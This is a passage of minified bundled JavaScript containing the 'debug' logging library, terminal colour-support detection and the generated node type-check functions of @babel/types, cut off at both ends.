`debug`.")}})();PV.colors=["#0000CC","#0000FF","#0033CC","#0033FF","#0066CC","#0066FF","#0099CC","#0099FF","#00CC00","#00CC33","#00CC66","#00CC99","#00CCCC","#00CCFF","#3300CC","#3300FF","#3333CC","#3333FF","#3366CC","#3366FF","#3399CC","#3399FF","#33CC00","#33CC33","#33CC66","#33CC99","#33CCCC","#33CCFF","#6600CC","#6600FF","#6633CC","#6633FF","#66CC00","#66CC33","#9900CC","#9900FF","#9933CC","#9933FF","#99CC00","#99CC33","#CC0000","#CC0033","#CC0066","#CC0099","#CC00CC","#CC00FF","#CC3300","#CC3333","#CC3366","#CC3399","#CC33CC","#CC33FF","#CC6600","#CC6633","#CC9900","#CC9933","#CCCC00","#CCCC33","#FF0000","#FF0033","#FF0066","#FF0099","#FF00CC","#FF00FF","#FF3300","#FF3333","#FF3366","#FF3399","#FF33CC","#FF33FF","#FF6600","#FF6633","#FF9900","#FF9933","#FFCC00","#FFCC33"];function jE(){if(typeof window!=="undefined"&&window.process&&(window.process.type==="renderer"||window.process.__nwjs))return!0;if(typeof navigator!=="undefined"&&navigator.userAgent&&navigator.userAgent.toLowerCase().match(/(edge|trident)\/(\d+)/))return!1;let X;return typeof document!=="undefined"&&document.documentElement&&document.documentElement.style&&document.documentElement.style.WebkitAppearance||typeof window!=="undefined"&&window.console&&(window.console.firebug||window.console.exception&&window.console.table)||typeof navigator!=="undefined"&&navigator.userAgent&&(X=navigator.userAgent.toLowerCase().match(/firefox\/(\d+)/))&&parseInt(X[1],10)>=31||typeof navigator!=="undefined"&&navigator.userAgent&&navigator.userAgent.toLowerCase().match(/applewebkit\/(\d+)/)}function OE(X){if(X[0]=(this.useColors?"%c":"")+this.namespace+(this.useColors?" %c":" ")+X[0]+(this.useColors?"%c ":" ")+"+"+V4.exports.humanize(this.diff),!this.useColors)return;let J="color: "+this.color;X.splice(1,0,J,"color: inherit");let Q=0,Y=0;X[0].replace(/%[a-zA-Z%]/g,(W)=>{if(W==="%%")return;if(Q++,W==="%c")Y=Q}),X.splice(Y,0,J)}PV.log=console.debug||console.log||(()=>{});function RE(X){try{if(X)PV.storage.setItem("debug",X);else PV.storage.removeItem("debug")}catch(J){}}function AE(){let X;try{X=PV.storage.getItem("debug")||PV.storage.getItem("DEBUG")}catch(J){}if(!X&&typeof process!=="undefined"&&"env"in process)X=process.env.DEBUG;return X}function NE(){try{return localStorage}catch(X){}}V4.exports=UW()(PV);var{formatters:LE}=V4.exports;LE.j=function(X){try{return JSON.stringify(X)}catch(J){return"[UnexpectedJSONParseError]: "+J.message}}});var _V=c((bp1,TV)=>{TV.exports=(X,J=process.argv)=>{let Q=X.startsWith("-")?"":X.length===1?"-":"--",Y=J.indexOf(Q+X),W=J.indexOf("--");return Y!==-1&&(W===-1||Y<W)}});var kV=c((vp1,$V)=>{var _E=m0("os"),EV=m0("tty"),Q8=_V(),{env:H9}=process,n6;if(Q8("no-color")||Q8("no-colors")||Q8("color=false")||Q8("color=never"))n6=0;else if(Q8("color")||Q8("colors")||Q8("color=true")||Q8("color=always"))n6=1;if("FORCE_COLOR"in H9)if(H9.FORCE_COLOR==="true")n6=1;else if(H9.FORCE_COLOR==="false")n6=0;else n6=H9.FORCE_COLOR.length===0?1:Math.min(parseInt(H9.FORCE_COLOR,10),3);function KW(X){if(X===0)return!1;return{level:X,hasBasic:!0,has256:X>=2,has16m:X>=3}}function VW(X,J){if(n6===0)return 0;if(Q8("color=16m")||Q8("color=full")||Q8("color=truecolor"))return 3;if(Q8("color=256"))return 2;if(X&&!J&&n6===void 0)return 0;let Q=n6||0;if(H9.TERM==="dumb")return Q;if(process.platform==="win32"){let Y=_E.release().split(".");if(Number(Y[0])>=10&&Number(Y[2])>=10586)return Number(Y[2])>=14931?3:2;return 1}if("CI"in H9){if(["TRAVIS","CIRCLECI","APPVEYOR","GITLAB_CI","GITHUB_ACTIONS","BUILDKITE"].some((Y)=>(Y in H9))||H9.CI_NAME==="codeship")return 1;return Q}if("TEAMCITY_VERSION"in H9)return/^(9\.(0*[1-9]\d*)\.|\d{2,}\.)/.test(H9.TEAMCITY_VERSION)?1:0;if(H9.COLORTERM==="truecolor")return 3;if("TERM_PROGRAM"in H9){let Y=parseInt((H9.TERM_PROGRAM_VERSION||"").split(".")[0],10);switch(H9.TERM_PROGRAM){case"iTerm.app":return Y>=3?3:2;case"Apple_Terminal":return 2}}if(/-256(color)?$/i.test(H9.TERM))return 2;if(/^screen|^xterm|^vt100|^vt220|^rxvt|color|ansi|cygwin|linux/i.test(H9.TERM))return 1;if("COLORTERM"in H9)return 1;return Q}function EE(X){let J=VW(X,X&&X.isTTY);return KW(J)}$V.exports={supportsColor:EE,stdout:KW(VW(!0,EV.isatty(1))),stderr:KW(VW(!0,EV.isatty(2)))}});var fV=c((vV,q4)=>{var $E=m0("tty"),B4=m0("util");vV.init=hE;vV.log=xE;vV.formatArgs=bE;vV.save=fE;vV.load=gE;vV.useColors=kE;vV.destroy=B4.deprecate(()=>{},"Instance method `debug.destroy()` is deprecated and no longer does anything. It will be removed in the next major version of `debug`.");vV.colors=[6,2,3,4,5,1];try{let X=kV();if(X&&(X.stderr||X).level>=2)vV.colors=[20,21,26,27,32,33,38,39,40,41,42,43,44,45,56,57,62,63,68,69,74,75,76,77,78,79,80,81,92,93,98,99,112,113,128,129,134,135,148,149,160,161,162,163,164,165,166,167,168,169,170,171,172,173,178,179,184,185,196,197,198,199,200,201,202,203,204,205,206,207,208,209,214,215,220,221]}catch(X){}vV.inspectOpts=Object.keys(process.env).filter((X)=>{return/^debug_/i.test(X)}).reduce((X,J)=>{let Q=J.substring(6).toLowerCase().replace(/_([a-z])/g,(W,z)=>{return z.toUpperCase()}),Y=process.env[J];if(/^(yes|on|true|enabled)$/i.test(Y))Y=!0;else if(/^(no|off|false|disabled)$/i.test(Y))Y=!1;else if(Y==="null")Y=null;else Y=Number(Y);return X[Q]=Y,X},{});function kE(){return"colors"in vV.inspectOpts?Boolean(vV.inspectOpts.colors):$E.isatty(process.stderr.fd)}function bE(X){let{namespace:J,useColors:Q}=this;if(Q){let Y=this.color,W="\x1B[3"+(Y<8?Y:"8;5;"+Y),z=`  ${W};1m${J} \x1B[0m`;X[0]=z+X[0].split(`
`).join(`
`+z),X.push(W+"m+"+q4.exports.humanize(this.diff)+"\x1B[0m")}else X[0]=vE()+J+" "+X[0]}function vE(){if(vV.inspectOpts.hideDate)return"";return new Date().toISOString()+" "}function xE(...X){return process.stderr.write(B4.formatWithOptions(vV.inspectOpts,...X)+`
`)}function fE(X){if(X)process.env.DEBUG=X;else delete process.env.DEBUG}function gE(){return process.env.DEBUG}function hE(X){X.inspectOpts={};let J=Object.keys(vV.inspectOpts);for(let Q=0;Q<J.length;Q++)X.inspectOpts[J[Q]]=vV.inspectOpts[J[Q]]}q4.exports=UW()(vV);var{formatters:bV}=q4.exports;bV.o=function(X){return this.inspectOpts.colors=this.useColors,B4.inspect(X,this.inspectOpts).split(`
`).map((J)=>J.trim()).join(" ")};bV.O=function(X){return this.inspectOpts.colors=this.useColors,B4.inspect(X,this.inspectOpts)}});var gV=c((fp1,BW)=>{if(typeof process==="undefined"||process.type==="renderer"||!1||process.__nwjs)BW.exports=SV();else BW.exports=fV()});var Z4=c((hV)=>{Object.defineProperty(hV,"__esModule",{value:!0});hV.default=iE;function iE(X,J){let Q=Object.keys(J);for(let Y of Q)if(X[Y]!==J[Y])return!1;return!0}});var uJ=c((mV)=>{Object.defineProperty(mV,"__esModule",{value:!0});mV.default=nE;var yV=new Set;function nE(X,J,Q="",Y=X){if(yV.has(Y))return;yV.add(Y);let{internal:W,trace:z}=aE(1,2);if(W)return;console.warn(`${Q}\`${X}\` has been deprecated, please migrate to \`${J}\`
${z}`)}function aE(X,J){let{stackTraceLimit:Q,prepareStackTrace:Y}=Error,W;if(Error.stackTraceLimit=1+X+J,Error.prepareStackTrace=function(G,H){W=H},new Error().stack,Error.stackTraceLimit=Q,Error.prepareStackTrace=Y,!W)return{internal:!1,trace:""};let z=W.slice(1+X,1+X+J);return{internal:/[\\/]@babel[\\/]/.test(z[1].getFileName()),trace:z.map((G)=>`    at ${G}`).join(`
`)}}});var i0=c((cV)=>{Object.defineProperty(cV,"__esModule",{value:!0});cV.isAccessor=Mf;cV.isAnyTypeAnnotation=kk;cV.isArgumentPlaceholder=Hv;cV.isArrayExpression=oE;cV.isArrayPattern=a$;cV.isArrayTypeAnnotation=bk;cV.isArrowFunctionExpression=s$;cV.isAssignmentExpression=tE;cV.isAssignmentPattern=n$;cV.isAwaitExpression=Ak;cV.isBigIntLiteral=Lk;cV.isBinary=fx;cV.isBinaryExpression=eE;cV.isBindExpression=Uv;cV.isBlock=yx;cV.isBlockParent=hx;cV.isBlockStatement=Y$;cV.isBooleanLiteral=I$;cV.isBooleanLiteralTypeAnnotation=xk;cV.isBooleanTypeAnnotation=vk;cV.isBreakStatement=W$;cV.isCallExpression=G$;cV.isCatchClause=z$;cV.isClass=Bf;cV.isClassAccessorProperty=Pk;cV.isClassBody=o$;cV.isClassDeclaration=e$;cV.isClassExpression=t$;cV.isClassImplements=gk;cV.isClassMethod=Bk;cV.isClassPrivateMethod=Tk;cV.isClassPrivateProperty=Sk;cV.isClassProperty=Ck;cV.isCompletionStatement=cx;cV.isConditional=lx;cV.isConditionalExpression=H$;cV.isContinueStatement=U$;cV.isDebuggerStatement=K$;cV.isDecimalLiteral=Mv;cV.isDeclaration=tx;cV.isDeclareClass=hk;cV.isDeclareExportAllDeclaration=rk;cV.isDeclareExportDeclaration=ik;cV.isDeclareFunction=yk;cV.isDeclareInterface=mk;cV.isDeclareModule=uk;cV.isDeclareModuleExports=ck;cV.isDeclareOpaqueType=pk;cV.isDeclareTypeAlias=lk;cV.isDeclareVariable=dk;cV.isDeclaredPredicate=nk;cV.isDecorator=Kv;cV.isDirective=J$;cV.isDirectiveLiteral=Q$;cV.isDoExpression=Vv;cV.isDoWhileStatement=V$;cV.isEmptyStatement=B$;cV.isEmptyTypeAnnotation=Gb;cV.isEnumBody=Lf;cV.isEnumBooleanBody=bb;cV.isEnumBooleanMember=gb;cV.isEnumDeclaration=kb;cV.isEnumDefaultedMember=mb;cV.isEnumMember=Df;cV.isEnumNumberBody=vb;cV.isEnumNumberMember=hb;cV.isEnumStringBody=xb;cV.isEnumStringMember=yb;cV.isEnumSymbolBody=fb;cV.isExistsTypeAnnotation=ak;cV.isExportAllDeclaration=Xk;cV.isExportDeclaration=qf;cV.isExportDefaultDeclaration=Jk;cV.isExportDefaultSpecifier=Bv;cV.isExportNamedDeclaration=Qk;cV.isExportNamespaceSpecifier=Dk;cV.isExportSpecifier=Yk;cV.isExpression=xx;cV.isExpressionStatement=q$;cV.isExpressionWrapper=ix;cV.isFile=Z$;cV.isFlow=jf;cV.isFlowBaseAnnotation=Rf;cV.isFlowDeclaration=Af;cV.isFlowPredicate=Nf;cV.isFlowType=Of;cV.isFor=rx;cV.isForInStatement=M$;cV.isForOfStatement=Wk;cV.isForStatement=F$;cV.isForXStatement=nx;cV.isFunction=ax;cV.isFunctionDeclaration=j$;cV.isFunctionExpression=O$;cV.isFunctionParameter=ex;cV.isFunctionParent=sx;cV.isFunctionTypeAnnotation=sk;cV.isFunctionTypeParam=ok;cV.isGenericTypeAnnotation=tk;cV.isIdentifier=R$;cV.isIfStatement=A$;cV.isImmutable=Wf;cV.isImport=Nk;cV.isImportAttribute=$k;cV.isImportDeclaration=Gk;cV.isImportDefaultSpecifier=zk;cV.isImportExpression=Kk;cV.isImportNamespaceSpecifier=Hk;cV.isImportOrExportDeclaration=uV;cV.isImportSpecifier=Uk;cV.isIndexedAccessType=ub;cV.isInferredPredicate=ek;cV.isInterfaceDeclaration=Jb;cV.isInterfaceExtends=Xb;cV.isInterfaceTypeAnnotation=Qb;cV.isInterpreterDirective=X$;cV.isIntersectionTypeAnnotation=Yb;cV.isJSX=wf;cV.isJSXAttribute=lb;cV.isJSXClosingElement=pb;cV.isJSXClosingFragment=Yv;cV.isJSXElement=db;cV.isJSXEmptyExpression=ib;cV.isJSXExpressionContainer=rb;cV.isJSXFragment=Jv;cV.isJSXIdentifier=ab;cV.isJSXMemberExpression=sb;cV.isJSXNamespacedName=ob;cV.isJSXOpeningElement=tb;cV.isJSXOpeningFragment=Qv;cV.isJSXSpreadAttribute=eb;cV.isJSXSpreadChild=nb;cV.isJSXText=Xv;cV.isLVal=Jf;cV.isLabeledStatement=N$;cV.isLiteral=Yf;cV.isLogicalExpression=P$;cV.isLoop=px;cV.isMemberExpression=S$;cV.isMetaProperty=Vk;cV.isMethod=zf;cV.isMiscellaneous=If;cV.isMixedTypeAnnotation=Wb;cV.isModuleDeclaration=bf;cV.isModuleExpression=Fv;cV.isModuleSpecifier=Zf;cV.isNewExpression=T$;cV.isNoop=Wv;cV.isNullLiteral=w$;cV.isNullLiteralTypeAnnotation=fk;cV.isNullableTypeAnnotation=zb;cV.isNumberLiteral=_f;cV.isNumberLiteralTypeAnnotation=Hb;cV.isNumberTypeAnnotation=Ub;cV.isNumericLiteral=D$;cV.isObjectExpression=E$;cV.isObjectMember=Hf;cV.isObjectMethod=$$;cV.isObjectPattern=qk;cV.isObjectProperty=k$;cV.isObjectTypeAnnotation=Kb;cV.isObjectTypeCallProperty=Bb;cV.isObjectTypeIndexer=qb;cV.isObjectTypeInternalSlot=Vb;cV.isObjectTypeProperty=Zb;cV.isObjectTypeSpreadProperty=Mb;cV.isOpaqueType=Fb;cV.isOptionalCallExpression=Ik;cV.isOptionalIndexedAccessType=cb;cV.isOptionalMemberExpression=wk;cV.isParenthesizedExpression=f$;cV.isPattern=Vf;cV.isPatternLike=Xf;cV.isPipelineBareFunction=Rv;cV.isPipelinePrimaryTopicReference=Av;cV.isPipelineTopicExpression=Ov;cV.isPlaceholder=Gv;cV.isPrivate=Ff;cV.isPrivateName=_k;cV.isProgram=_$;cV.isProperty=Uf;cV.isPureish=ox;cV.isQualifiedTypeIdentifier=jb;cV.isRecordExpression=qv;cV.isRegExpLiteral=C$;cV.isRegexLiteral=Ef;cV.isRestElement=b$;cV.isRestProperty=$f;cV.isReturnStatement=v$;cV.isScopable=gx;cV.isSequenceExpression=x$;cV.isSpreadElement=Zk;cV.isSpreadProperty=kf;cV.isStandardized=vx;cV.isStatement=mx;cV.isStaticBlock=Ek;cV.isStringLiteral=L$;cV.isStringLiteralTypeAnnotation=Ob;cV.isStringTypeAnnotation=Rb;cV.isSuper=Mk;cV.isSwitchCase=g$;cV.isSwitchStatement=h$;cV.isSymbolTypeAnnotation=Ab;cV.isTSAnyKeyword=Ev;cV.isTSArrayType=sv;cV.isTSAsExpression=jx;cV.isTSBaseType=Tf;cV.isTSBigIntKeyword=kv;cV.isTSBooleanKeyword=$v;cV.isTSCallSignatureDeclaration=Cv;cV.isTSConditionalType=Yx;cV.isTSConstructSignatureDeclaration=Pv;cV.isTSConstructorType=dv;cV.isTSDeclareFunction=Dv;cV.isTSDeclareMethod=wv;cV.isTSEntityName=Qf;cV.isTSEnumBody=Ax;cV.isTSEnumDeclaration=Nx;cV.isTSEnumMember=Lx;cV.isTSExportAssignment=Tx;cV.isTSExpressionWithTypeArguments=Bx;cV.isTSExternalModuleReference=Px;cV.isTSFunctionType=pv;cV.isTSImportEqualsDeclaration=Cx;cV.isTSImportType=Ix;cV.isTSIndexSignature=_v;cV.isTSIndexedAccessType=Hx;cV.isTSInferType=Wx;cV.isTSInstantiationExpression=Fx;cV.isTSInterfaceBody=Zx;cV.isTSInterfaceDeclaration=qx;cV.isTSIntersectionType=Qx;cV.isTSIntrinsicKeyword=bv;cV.isTSLiteralType=Vx;cV.isTSMappedType=Ux;cV.isTSMethodSignature=Tv;cV.isTSModuleBlock=wx;cV.isTSModuleDeclaration=Dx;cV.isTSNamedTupleMember=Xx;cV.isTSNamespaceExportDeclaration=_x;cV.isTSNeverKeyword=vv;cV.isTSNonNullExpression=Sx;cV.isTSNullKeyword=xv;cV.isTSNumberKeyword=fv;cV.isTSObjectKeyword=gv;cV.isTSOptionalType=tv;cV.isTSParameterProperty=Lv;cV.isTSParenthesizedType=Gx;cV.isTSPropertySignature=Sv;cV.isTSQualifiedName=Iv;cV.isTSRestType=ev;cV.isTSSatisfiesExpression=Ox;cV.isTSStringKeyword=hv;cV.isTSSymbolKeyword=yv;cV.isTSTemplateLiteralType=Kx;cV.isTSThisType=lv;cV.isTSTupleType=ov;cV.isTSType=Sf;cV.isTSTypeAliasDeclaration=Mx;cV.isTSTypeAnnotation=Ex;cV.isTSTypeAssertion=Rx;cV.isTSTypeElement=Pf;cV.isTSTypeLiteral=av;cV.isTSTypeOperator=zx;cV.isTSTypeParameter=bx;cV.isTSTypeParameterDeclaration=kx;cV.isTSTypeParameterInstantiation=$x;cV.isTSTypePredicate=rv;cV.isTSTypeQuery=nv;cV.isTSTypeReference=iv;cV.isTSUndefinedKeyword=mv;cV.isTSUnionType=Jx;cV.isTSUnknownKeyword=uv;cV.isTSVoidKeyword=cv;cV.isTaggedTemplateExpression=Fk;cV.isTemplateElement=jk;cV.isTemplateLiteral=Ok;cV.isTerminatorless=ux;cV.isThisExpression=y$;cV.isThisTypeAnnotation=Nb;cV.isThrowStatement=m$;cV.isTopicReference=jv;cV.isTryStatement=u$;cV.isTupleExpression=Zv;cV.isTupleTypeAnnotation=Lb;cV.isTypeAlias=wb;cV.isTypeAnnotation=Ib;cV.isTypeCastExpression=Cb;cV.isTypeParameter=Pb;cV.isTypeParameterDeclaration=Sb;cV.isTypeParameterInstantiation=Tb;cV.isTypeScript=Cf;cV.isTypeofTypeAnnotation=Db;cV.isUnaryExpression=c$;cV.isUnaryLike=Kf;cV.isUnionTypeAnnotation=_b;cV.isUpdateExpression=l$;cV.isUserWhitespacable=Gf;cV.isV8IntrinsicIdentifier=zv;cV.isVariableDeclaration=p$;cV.isVariableDeclarator=d$;cV.isVariance=Eb;cV.isVoidPattern=Nv;cV.isVoidTypeAnnotation=$b;cV.isWhile=dx;cV.isWhileStatement=i$;cV.isWithStatement=r$;cV.isYieldExpression=Rk;var I=Z4(),w5=uJ();function oE(X,J){if(!X)return!1;if(X.type!=="ArrayExpression")return!1;return J==null||I.default(X,J)}function tE(X,J){if(!X)return!1;if(X.type!=="AssignmentExpression")return!1;return J==null||I.default(X,J)}function eE(X,J){if(!X)return!1;if(X.type!=="BinaryExpression")return!1;return J==null||I.default(X,J)}function X$(X,J){if(!X)return!1;if(X.type!=="InterpreterDirective")return!1;return J==null||I.default(X,J)}function J$(X,J){if(!X)return!1;if(X.type!=="Directive")return!1;return J==null||I.default(X,J)}function Q$(X,J){if(!X)return!1;if(X.type!=="DirectiveLiteral")return!1;return J==null||I.default(X,J)}function Y$(X,J){if(!X)return!1;if(X.type!=="BlockStatement")return!1;return J==null||I.default(X,J)}function W$(X,J){if(!X)return!1;if(X.type!=="BreakStatement")return!1;return J==null||I.default(X,J)}function G$(X,J){if(!X)return!1;if(X.type!=="CallExpression")return!1;return J==null||I.default(X,J)}function z$(X,J){if(!X)return!1;if(X.type!=="CatchClause")return!1;return J==null||I.default(X,J)}function H$(X,J){if(!X)return!1;if(X.type!=="ConditionalExpression")return!1;return J==null||I.default(X,J)}function U$(X,J){if(!X)return!1;if(X.type!=="ContinueStatement")return!1;return J==null||I.default(X,J)}function K$(X,J){if(!X)return!1;if(X.type!=="DebuggerStatement")return!1;return J==null||I.default(X,J)}function V$(X,J){if(!X)return!1;if(X.type!=="DoWhileStatement")return!1;return J==null||I.default(X,J)}function B$(X,J){if(!X)return!1;if(X.type!=="EmptyStatement")return!1;return J==null||I.default(X,J)}function q$(X,J){if(!X)return!1;if(X.type!=="ExpressionStatement")return!1;return J==null||I.default(X,J)}function Z$(X,J){if(!X)return!1;if(X.type!=="File")return!1;return J==null||I.default(X,J)}function M$(X,J){if(!X)return!1;if(X.type!=="ForInStatement")return!1;return J==null||I.default(X,J)}function F$(X,J){if(!X)return!1;if(X.type!=="ForStatement")return!1;return J==null||I.default(X,J)}function j$(X,J){if(!X)return!1;if(X.type!=="FunctionDeclaration")return!1;return J==null||I.default(X,J)}function O$(X,J){if(!X)return!1;if(X.type!=="FunctionExpression")return!1;return J==null||I.default(X,J)}function R$(X,J){if(!X)return!1;if(X.type!=="Identifier")return!1;return J==null||I.default(X,J)}function A$(X,J){if(!X)return!1;if(X.type!=="IfStatement")return!1;return J==null||I.default(X,J)}function N$(X,J){if(!X)return!1;if(X.type!=="LabeledStatement")return!1;return J==null||I.default(X,J)}function L$(X,J){if(!X)return!1;if(X.type!=="StringLiteral")return!1;return J==null||I.default(X,J)}function D$(X,J){if(!X)return!1;if(X.type!=="NumericLiteral")return!1;return J==null||I.default(X,J)}function w$(X,J){if(!X)return!1;if(X.type!=="NullLiteral")return!1;return J==null||I.default(X,J)}function I$(X,J){if(!X)return!1;if(X.type!=="BooleanLiteral")return!1;return J==null||I.default(X,J)}function C$(X,J){if(!X)return!1;if(X.type!=="RegExpLiteral")return!1;return J==null||I.default(X,J)}function P$(X,J){if(!X)return!1;if(X.type!=="LogicalExpression")return!1;return J==null||I.default(X,J)}function S$(X,J){if(!X)return!1;if(X.type!=="MemberExpression")return!1;return J==null||I.default(X,J)}function T$(X,J){if(!X)return!1;if(X.type!=="NewExpression")return!1;return J==null||I.default(X,J)}function _$(X,J){if(!X)return!1;if(X.type!=="Program")return!1;return J==null||I.default(X,J)}function E$(X,J){if(!X)return!1;if(X.type!=="ObjectExpression")return!1;return J==null||I.default(X,J)}function $$(X,J){if(!X)return!1;if(X.type!=="ObjectMethod")return!1;return J==null||I.default(X,J)}function k$(X,J){if(!X)return!1;if(X.type!=="ObjectProperty")return!1;return J==null||I.default(X,J)}function b$(X,J){if(!X)return!1;if(X.type!=="RestElement")return!1;return J==null||I.default(X,J)}function v$(X,J){if(!X)return!1;if(X.type!=="ReturnStatement")return!1;return J==null||I.default(X,J)}function x$(X,J){if(!X)return!1;if(X.type!=="SequenceExpression")return!1;return J==null||I.default(X,J)}function f$(X,J){if(!X)return!1;if(X.type!=="ParenthesizedExpression")return!1;return J==null||I.default(X,J)}function g$(X,J){if(!X)return!1;if(X.type!=="SwitchCase")return!1;return J==null||I.default(X,J)}function h$(X,J){if(!X)return!1;if(X.type!=="SwitchStatement")return!1;return J==null||I.default(X,J)}function y$(X,J){if(!X)return!1;if(X.type!=="ThisExpression")return!1;return J==null||I.default(X,J)}function m$(X,J){if(!X)return!1;if(X.type!=="ThrowStatement")return!1;return J==null||I.default(X,J)}function u$(X,J){if(!X)return!1;if(X.type!=="TryStatement")return!1;return J==null||I.default(X,J)}function c$(X,J){if(!X)return!1;if(X.type!=="UnaryExpression")return!1;return J==null||I.default(X,J)}function l$(X,J){if(!X)return!1;if(X.type!=="UpdateExpression")return!1;return J==null||I.default(X,J)}function p$(X,J){if(!X)return!1;if(X.type!=="VariableDeclaration")return!1;return J==null||I.default(X,J)}function d$(X,J){if(!X)return!1;if(X.type!=="VariableDeclarator")return!1;return J==null||I.default(X,J)}function i$(X,J){if(!X)return!1;if(X.type!=="WhileStatement")return!1;return J==null||I.default(X,J)}function r$(X,J){if(!X)return!1;if(X.type!=="WithStatement")return!1;return J==null||I.default(X,J)}function n$(X,J){if(!X)return!1;if(X.type!=="AssignmentPattern")return!1;return J==null||I.default(X,J)}function a$(X,J){if(!X)return!1;if(X.type!=="ArrayPattern")return!1;return J==null||I.default(X,J)}function s$(X,J){if(!X)return!1;if(X.type!=="ArrowFunctionExpression")return!1;return J==null||I.default(X,J)}function o$(X,J){if(!X)return!1;if(X.type!=="ClassBody")return!1;return J==null||I.default(X,J)}function t$(X,J){if(!X)return!1;if(X.type!=="ClassExpression")return!1;return J==null||I.default(X,J)}function e$(X,J){if(!X)return!1;if(X.type!=="ClassDeclaration")return!1;return J==null||I.default(X,J)}function Xk(X,J){if(!X)return!1;if(X.type!=="ExportAllDeclaration")return!1;return J==null||I.default(X,J)}function Jk(X,J){if(!X)return!1;if(X.type!=="ExportDefaultDeclaration")return!1;return J==null||I.default(X,J)}function Qk(X,J){if(!X)return!1;if(X.type!=="ExportNamedDeclaration")return!1;return J==null||I.default(X,J)}function Yk(X,J){if(!X)return!1;if(X.type!=="ExportSpecifier")return!1;return J==null||I.default(X,J)}function Wk(X,J){if(!X)return!1;if(X.type!=="ForOfStatement")return!1;return J==null||I.default(X,J)}function Gk(X,J){if(!X)return!1;if(X.type!=="ImportDeclaration")return!1;return J==null||I.default(X,J)}function zk(X,J){if(!X)return!1;if(X.type!=="ImportDefaultSpecifier")return!1;return J==null||I.default(X,J)}function Hk(X,J){if(!X)return!1;if(X.type!=="ImportNamespaceSpecifier")return!1;return J==null||I.default(X,J)}function Uk(X,J){if(!X)return!1;if(X.type!=="ImportSpecifier")return!1;return J==null||I.default(X,J)}function Kk(X,J){if(!X)return!1;if(X.type!=="ImportExpression")return!1;return J==null||I.default(X,J)}function Vk(X,J){if(!X)return!1;if(X.type!=="MetaProperty")return!1;return J==null||I.default(X,J)}function Bk(X,J){if(!X)return!1;if(X.type!=="ClassMethod")return!1;return J==null||I.default(X,J)}function qk(X,J){if(!X)return!1;if(X.type!=="ObjectPattern")return!1;return J==null||I.default(X,J)}function Zk(X,J){if(!X)return!1;if(X.type!=="SpreadElement")return!1;return J==null||I.default(X,J)}function Mk(X,J){if(!X)return!1;if(X.type!=="Super")return!1;return J==null||I.default(X,J)}function Fk(X,J){if(!X)return!1;if(X.type!=="TaggedTemplateExpression")return!1;return J==null||I.default(X,J)}function jk(X,J){if(!X)return!1;if(X.type!=="TemplateElement")return!1;return J==null||I.default(X,J)}function Ok(X,J){if(!X)return!1;if(X.type!=="TemplateLiteral")return!1;return J==null||I.default(X,J)}function Rk(X,J){if(!X)return!1;if(X.type!=="YieldExpression")return!1;return J==null||I.default(X,J)}function Ak(X,J){if(!X)return!1;if(X.type!=="AwaitExpression")return!1;return J==null||I.default(X,J)}function Nk(X,J){if(!X)return!1;if(X.type!=="Import")return!1;return J==null||I.default(X,J)}function Lk(X,J){if(!X)return!1;if(X.type!=="BigIntLiteral")return!1;return J==null||I.default(X,J)}function Dk(X,J){if(!X)return!1;if(X.type!=="ExportNamespaceSpecifier")return!1;return J==null||I.default(X,J)}function wk(X,J){if(!X)return!1;if(X.type!=="OptionalMemberExpression")return!1;return J==null||I.default(X,J)}function Ik(X,J){if(!X)return!1;if(X.type!=="OptionalCallExpression")return!1;return J==null||I.default(X,J)}function Ck(X,J){if(!X)return!1;if(X.type!=="ClassProperty")return!1;return J==null||I.default(X,J)}function Pk(X,J){if(!X)return!1;if(X.type!=="ClassAccessorProperty")return!1;return J==null||I.default(X,J)}function Sk(X,J){if(!X)return!1;if(X.type!=="ClassPrivateProperty")return!1;return J==null||I.default(X,J)}function Tk(X,J){if(!X)return!1;if(X.type!=="ClassPrivateMethod")return!1;return J==null||I.default(X,J)}function _k(X,J){if(!X)return!1;if(X.type!=="PrivateName")return!1;return J==null||I.default(X,J)}function Ek(X,J){if(!X)return!1;if(X.type!=="StaticBlock")return!1;return J==null||I.default(X,J)}function $k(X,J){if(!X)return!1;if(X.type!=="ImportAttribute")return!1;return J==null||I.default(X,J)}function kk(X,J){if(!X)return!1;if(X.type!=="AnyTypeAnnotation")return!1;return J==null||I.default(X,J)}function bk(X,J){if(!X)return!1;if(X.type!=="ArrayTypeAnnotation")return!1;return J==null||I.default(X,J)}function vk(X,J){if(!X)return!1;if(X.type!=="BooleanTypeAnnotation")return!1;return J==null||I.default(X,J)}function xk(X,J){if(!X)return!1;if(X.type!=="BooleanLiteralTypeAnnotation")return!1;return J==null||I.default(X,J)}function fk(X,J){if(!X)return!1;if(X.type!=="NullLiteralTypeAnnotation")return!1;return J==null||I.default(X,J)}function gk(X,J){if(!X)return!1;if(X.type!=="ClassImplements")return!1;return J==null||I.default(X,J)}function hk(X,J){if(!X)return!1;if(X.type!=="DeclareClass")return!1;return J==null||I.default(X,J)}function yk(X,J){if(!X)return!1;if(X.type!=="DeclareFunction")return!1;return J==null||I.default(X,J)}function mk(X,J){if(!X)return!1;if(X.type!=="DeclareInterface")return!1;return J==null||I.default(X,J)}function uk(X,J){if(!X)return!1;if(X.type!=="DeclareModule")return!1;return J==null||I.default(X,J)}function ck(X,J){if(!X)return!1;if(X.type!=="DeclareModuleExports")return!1;return J==null||I.default(X,J)}function lk(X,J){if(!X)return!1;if(X.type!=="DeclareTypeAlias")return!1;return J==null||I.default(X,J)}function pk(X,J){if(!X)return!1;if(X.type!=="DeclareOpaqueType")return!1;return J==null||I.default(X,J)}function dk(X,J){if(!X)return!1;if(X.type!=="DeclareVariable")return!1;return J==null||I.default(X,J)}function ik(X,J){if(!X)return!1;if(X.type!=="DeclareExportDeclaration")return!1;return J==null||I.default(X,J)}function rk(X,J){if(!X)return!1;if(X.type!=="DeclareExportAllDeclaration")return!1;return J==null||I.default(X,J)}function nk(X,J){if(!X)return!1;if(X.type!=="DeclaredPredicate")return!1;return J==null||I.default(X,J)}function ak(X,J){if(!X)return!1;if(X.type!=="ExistsTypeAnnotation")return!1;return J==null||I.default(X,J)}function sk(X,J){if(!X)return!1;if(X.type!=="FunctionTypeAnnotation")return!1;return J==null||I.default(X,J)}function ok(X,J){if(!X)return!1;if(X.type!=="FunctionTypeParam")return!1;return J==null||I.default(X,J)}function tk(X,J){if(!X)return!1;if(X.type!=="GenericTypeAnnotation")return!1;return J==null||I.default(X,J)}function ek(X,J){if(!X)return!1;if(X.type!=="InferredPredicate")return!1;return J==null||I.default(X,J)}function Xb(X,J){if(!X)return!1;if(X.type!=="InterfaceExtends")return!1;return J==null||I.default(X,J)}function 